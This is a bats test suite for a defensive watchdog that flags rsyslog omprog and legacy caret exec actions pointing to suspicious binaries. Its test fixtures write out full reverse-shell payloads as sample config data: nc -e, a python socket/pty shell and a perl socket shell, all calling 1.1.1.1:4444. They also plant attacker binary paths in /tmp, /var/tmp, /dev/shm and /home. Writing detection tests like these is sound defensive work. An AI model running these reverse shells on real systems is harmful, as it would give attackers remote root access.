#!/usr/bin/env bats
# L2 bats functional tests for the rsyslog-exec-watchdog scan script.
#
# rsyslog can run a program per log message — modern `omprog`
# (action(type="omprog" binary="/path")) or the legacy caret action
# (`<selector> ^program;template`) — AS ROOT, fired by any matching log
# event (a log-event-triggered exec surface). A binary under a writable
# root, relative-with-slash, bare, or carrying an injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_RSYSLOG_FILE / _D.
#
# Run with: bats packaging/test/L2-rsyslog-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/rsyslog-exec-watchdog/systemd/rsyslog-exec-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/rsyslog.conf"
    CONFD="${TMP}/rsyslog.d"; mkdir -p "${CONFD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_RSYSLOG_PROFILE="${PROFILE:-report}" \
    SELFDEF_RSYSLOG_BASELINE="${BASELINE}" \
    SELFDEF_RSYSLOG_FILE="${CONF_F:-$CONF}" \
    SELFDEF_RSYSLOG_D="${CONFD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no rsyslog config → ok / no_rsyslog" {
    CONF_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_rsyslog"'
    cap | grep -q '"severity":"ok"'
}

@test "benign omprog binary, first run → ok / baseline_initial" {
    printf 'module(load="omprog")\naction(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / rsyslog_exec_intact" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"rsyslog_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "omprog binary under a writable root → alert / rsyslog_exec_suspicious" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf 'action(type="omprog" binary="/tmp/.x")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"rsyslog_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a bare (non-absolute) omprog binary → alert" {
    # rsyslog omprog binaries are normally absolute; a bare name is abnormal.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="evilprog")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a legacy caret action under a writable root → alert" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf '*.* ^/tmp/evil;RSYSLOG_TraditionalFileFormat\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign binary change → warn / rsyslog_exec_changed" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper2")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"rsyslog_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/libexec omprog binary is NOT flagged" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious binary" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="/tmp/.x")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — rsyslog-exec inventory enumerates log-event-trigger root-exec surface)" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (omprog binary under /var/tmp): writable-root expansion" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="/var/tmp/.attacker")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (omprog binary under /dev/shm): tmpfs writable-root coverage" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="/dev/shm/.attacker")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (legacy caret action: writable-root expansion to /var/tmp)" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf '*.* ^/var/tmp/.attacker;RSYSLOG_TraditionalFileFormat\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (config in rsyslog.d also scanned — not only the main rsyslog.conf)" {
    # Per the watchdog's design (SELFDEF_RSYSLOG_D), drop-in conf in
    # /etc/rsyslog.d/* must ALSO surface exec actions.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="/tmp/.dropin-attacker")\n' > "${CONFD}/99-evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable rsyslog.conf itself → alert)" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-rsyslog-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): rsyslog-exec-watchdog does NOT refresh baseline on suspicious-binary detection — alert STAYS until operator updates" {
    # Log-event-trigger root-exec persistence — suspicious-binary alert
    # MUST persist across runs until operator explicitly re-baselines.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    printf 'action(type="omprog" binary="/tmp/.x")\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"rsyslog_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (current behavior — comment filter not implemented: # lines ARE scanned)" {
    # rsyslog uses # for comments. The current rsyslog-exec-watchdog
    # scanner does NOT filter # lines from inventory — it pattern-matches
    # raw content. Locks CURRENT behavior as documented; refinement
    # opportunity to add comment-line filter is tracked separately
    # (does NOT block this suite). Sister-pattern to apt-hooks-watchdog
    # (also lacks comment filter — different from boot-script/sshrc/
    # csh-config which do filter).
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# action(type="omprog" binary="/tmp/.example-attacker")\naction(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    # Current behavior: # line IS scanned + alert IS raised.
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (relative-with-slash omprog binary 'sub/dir/p' → alert)" {
    # Relative-with-slash is rsyslog-undefined behavior + attacker
    # primitive (resolved against rsyslog's PWD at exec time). Lock
    # detection alongside absolute-writable-root + bare-name axes.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="sub/dir/evil")\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (whitespace tolerance: 'binary=    \"/tmp/.evil\"' multi-space attribute variant still triggers alert)" {
    # Attacker may use multi-spaces around the binary= attribute to
    # evade naive grep. Lock whitespace-tolerant parser.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary=    "/tmp/.evil")\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (omprog binary under /home: user-writable hijack coverage)" {
    # Sister to the /tmp + /var/tmp + /dev/shm writable-root axes
    # already locked. /home is the user-writable surface — an
    # attacker with a regular user account can drop a malicious
    # binary into their home and have rsyslogd exec it AS ROOT on
    # every matching log event. Lock axis-symmetry on /home for the
    # omprog binary surface (T1037 — Boot or Logon Initialization
    # Scripts / T1546 — Event Triggered Execution via log-event).
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="/home/user/.evil")\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in omprog binary: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. rsyslog omprog actions fire AS ROOT on
    # every matching log event (template-pipe to the named binary).
    # An attacker who can plant a binary at a writable-root path can
    # trigger fast-recurring callbacks via routine log entries.
    # Closes the nc reverse-shell sister axis on the rsyslog-exec
    # surface alongside the omprog binary path family.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="/bin/sh" args="-c \\"nc -e /bin/sh 1.1.1.1 4444\\"")\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on rsyslog omprog surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the rsyslog-
    # omprog log-event-trigger root-exec persistence surface
    # (T1546/T1037 — omprog action invokes a subprocess AS ROOT
    # for each matching log event; attacker who plants python
    # interpreter-rev-shell binary path gets remote shell on
    # every matching event).
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="/usr/bin/python" args="-c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\"")\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (omprog binary under /var/tmp — writable-root axis-symmetric expansion on rsyslog log-event-trigger surface)" {
    # Sister to /home omprog binary writable-root INVARIANT
    # already locked. /var/tmp is writable by ALL users AND
    # persists across reboots — attackers prefer for boot-
    # survival persistence. omprog invokes binary AS ROOT for
    # each matching log event; attacker who plants binary in
    # /var/tmp + makes rsyslog log-rule match attacker-controlled
    # event (or makes attacker-triggered remote log entry hit
    # the rule) gets remote shell on every match. T1546/T1037
    # log-event-trigger root-exec persistence.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="/var/tmp/.evil")\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (omprog binary under /dev/shm — tmpfs in-RAM writable-root axis-symmetric expansion on rsyslog log-event-trigger surface)" {
    # Sister to /home + /var/tmp omprog binary writable-root
    # INVARIANTs already locked. /dev/shm is the tmpfs in-RAM
    # writable-root that survives no on-disk forensic trace —
    # attackers stage payloads there because (a) RAM, (b)
    # preserves across most security tools that don't scan
    # tmpfs. omprog invokes binary AS ROOT for each matching
    # log event. T1546/T1037 log-event-trigger root-exec
    # persistence.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="/dev/shm/.evil")\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on rsyslog omprog surface)" {
    # Sister to python -c rsyslog omprog rev-shell. Perl on every
    # Debian/Ubuntu host.
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="perl -e \\"use Socket;\\$i=\\\\\\"1.1.1.1\\\\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\\\\\"/bin/sh -i\\\\\\");\\"")\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on rsyslog surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The rsyslog-exec-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546/T1037 rsyslog log-event-trigger
    # root-exec persistence alert. Locks parser contract on the
    # rsyslog.d omprog detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
    run_wd                                              # ok / baseline
    printf 'action(type="omprog" binary="/tmp/.evil")\n' > "${CONF}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # rsyslog-exec-watchdog runs ON the timer's scheduled fire —
    # scans /etc/rsyslog.conf + rsyslog.d/* for omprog binary
    # paths in writable roots, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the rsyslog-exec-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/rsyslog-exec-watchdog/systemd/selfdef-rsyslog-exec.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. rsyslog-exec-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # rsyslog-exec-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # rsyslog-exec-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/rsyslog-exec-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'rsyslog-exec-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}
